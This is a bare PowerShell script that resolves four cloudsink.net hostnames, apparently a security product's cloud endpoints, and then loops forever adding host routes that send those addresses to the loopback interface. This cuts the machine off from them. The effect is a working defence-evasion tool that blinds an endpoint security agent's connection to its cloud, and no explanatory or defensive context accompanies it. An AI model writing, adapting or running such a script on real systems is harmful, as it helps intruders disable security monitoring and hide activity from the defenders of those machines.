$target_URLs = @("ts01-gyr-maverick.cloudsink.net", "ts01-b.cloudsink.net", "lfodown01-gyr-maverick.cloudsink.net", "lfodown01-b.cloudsink.net")
$IPs =@()
$target_URLs | foreach-object {Invoke-WebRequest -TimeoutSec 1 -uri $_

    try{
        $datum = (get-dnsclientcache -entry $_ -ErrorAction Continue).data
    $IPs += $datum
    }
    catch{
    write-host ""
    
    }
}

$IPs

$InterfaceAlias = "*Loopback*"

# Get the loopback interface index
$InterfaceIndex = (Get-NetIPInterface | Where-Object {$_.InterfaceAlias -like $InterfaceAlias}).InterfaceIndex
while ($true){
    $IPs | ForEach-Object{
        $meesa = $_ + "/32"
        $meesa
        new-netroute -DestinationPrefix $meesa -InterfaceIndex $InterfaceIndex -NextHop "127.0.0.1"
     }
            
}
